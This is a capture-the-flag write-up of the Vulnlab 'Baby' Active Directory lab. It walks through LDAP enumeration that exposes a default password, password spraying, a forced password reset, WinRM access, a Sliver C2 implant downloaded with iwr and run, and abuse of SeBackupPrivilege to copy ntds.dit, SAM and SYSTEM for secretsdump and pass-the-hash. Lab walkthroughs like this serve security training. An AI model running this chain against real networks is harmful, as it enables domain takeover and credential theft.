---
title: "Vulnlab - Baby [Easy]"
date: 2023-12-18T10:42:27+03:00
draft: false
tags: ["vulnlab"]
---

Recently I've started to explore more platforms for hacking different type of boxes and I found that `xct` has created `vulnlab`. From what I've explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the "Baby" lab.

https://www.vulnlab.com/

# User / Initial Foothold

Started with a nmap scan:

```bash
sylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap.txt -sC -sV $ip -Pn
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49664/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
59647/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/17%Time=657F4FC2%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be `baby.vl`, I will add this to my `/etc/hosts` file. After that, I ran `enum4linux`.

(I will post only the interesting results)
```bash
sylsec$ enum4linux $ip
...
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: baby.vl
...
[+] Found domain information via SMB
NetBIOS computer name: BABYDC
NetBIOS domain name: BABY
DNS domain: baby.vl
FQDN: BabyDC.baby.vl
Derived membership: domain member
Derived domain: BABY
...
Server allows session using username '', password ''
...
[+] Domain: BABY
[+] Domain SID: S-1-5-21-1407081343-4001094062-1444647654
[+] Membership: domain member
...
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
...
```

This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with `ldapsearch`.

``` bash
sylsec$ ldapsearch -LLL -x -H ldap://$ip -b '' -s base '(objectclass=*)'
...
rootDomainNamingContext: DC=baby,DC=vl
ldapServiceName: baby.vl:babydc$@BABY.VL
```

This didn't yield that much information but we can search for the specific domain components (`baby,vl`)

(Only the interesting information)
```bash 
sylsec$ ldapsearch -x -H ldap://$ip -D '' -w '' -b "DC=baby,DC=vl"
...
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
...
<other users>
```

Now we've learned that the initial password for the users is `BabyStart123!`, we can save all the found users under users.txt and try the password against all of them with `netexec` (previously `CrackMapExec`).

```bash
sylsec$ netexec smb $ip -u ./users.txt -p ./passwords.txt 
SMB         10.10.83.68     445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
...
SMB         10.10.10.6      445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
...
```

We found that the user `caroline.robinson` has the status `STATUS_PASSWORD_MUST_CHANGE`, we can use `smbpasswd.py` from the impacket scripts to change the password.

```bash
sylsec$ python3 smbpasswd.py baby.vl/Caroline.Robinson:'BabyStart123!'@$ip -newpass Summer2018!
[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

Now, let's try to use WinRM to log in to the machine.

```bash
sylsec$ evil-winrm -i $ip -u Caroline.Robinson -p 'Summer2018!'
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> type ..\Desktop\user.txt
VL{<hash>}
```

# Root / Privilege Escalation

Since I highly dislike `evil-winrm` due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up [SilverC2](https://github.com/BishopFox/sliver).

```
sylsec$ silversrv

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain fear
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > generate --mtls tun0:8888
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 39s
[*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe
```

Now, that I have an implant, I've transferred it to the server with `Invoke-WebRequest`.

```powershell
*Evil-WinRM* PS C:\Windows\TEMP> iwr http://<myIp>:8000/EXISTING_CROTCH.exe -OutFile EXISTING_CROTCH.exe
*Evil-WinRM* PS C:\Windows\TEMP> .\EXISTING_CROTCH.exe
```

I've set up a listener and once I invoke the implant on the machine I will get a session on my server.

```bash
[*] Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 (BabyDC) - windows/amd64 - Mon, 18 Dec 2023 09:57:19 EET
```

Then I've started to enumerate the privileges first.

```
[server] sliver (EXISTING_CROTCH) > getprivs

Privilege Information for EXISTING_CROTCH.exe (PID: 3248)
---------------------------------------------------------

Process Integrity Level: High

Name                            Description                     Attributes
====                            ===========                     ==========
SeMachineAccountPrivilege       Add workstations to domain      Enabled, Enabled by Default
SeBackupPrivilege               Back up files and directories   Enabled, Enabled by Default
SeRestorePrivilege              Restore files and directories   Enabled, Enabled by Default
SeShutdownPrivilege             Shut down the system            Enabled, Enabled by Default
SeChangeNotifyPrivilege         Bypass traverse checking        Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege   Increase a process working set  Enabled, Enabled by Default
```

And I noticed that we have the `SeBackupPrivilege` and `SeRestorePrivilege` privilege enabled, that automatically means that we can abuse those to get the `ntds.dit,SAM,SYSTEM` files to obtain some hashes that we can use further to escalate our privileges.

There are a lot of resources for this technique, here are some of my favorite reads:
- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
- https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup
- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/


I created a file on my local system called `syl.dsh` which is basically a script file that can execute series of commands, the contents is as follows:

```bat
set context persistent nowriters
add volume c: alias syl
create
expose %syl% z:
```

This sets the context to be persistent, so that the shadow copies will be kept after the `diskshadow` session is closed. Then we add a shadowcopy of the C:\ drive with the alias `syl`, we create it and we expose it as another drive `Z:`

Then we can download the shadow copy of the `ntds` file using the SilverC2's interactive mode.

```bash
[server] sliver (EXISTING_CROTCH) > download Z:\Windows\ntds
```

And we also need the SYSTEM and SAM files, which we can get by invoking the `reg` utility.

```bash
[server] sliver (EXISTING_CROTCH) > reg save hklm\sam c:\Temp\sam
[server] sliver (EXISTING_CROTCH) > reg save hklm\system c:\Temp\system
...
[server] sliver (EXISTING_CROTCH) > download system
[*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/system
[server] sliver (EXISTING_CROTCH) > download SAM
[*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/SAM
```

Now we can extract the hashes with `impacket-secretsdump`


```bash
sylsec$ python3 secretsdump.py -system /home/syl/vulnlab/Baby/exfiltrated/system -sam /home/syl/vulnlab/Baby/exfiltrated/SAM -ntds /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH>:::
...
```

And once we've extracted the hash, we can log in to the DC using WinRM.

```bash
sylsec$ evil-winrm -i $ip -u Administrator -H $hash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
VL{<hash>}
```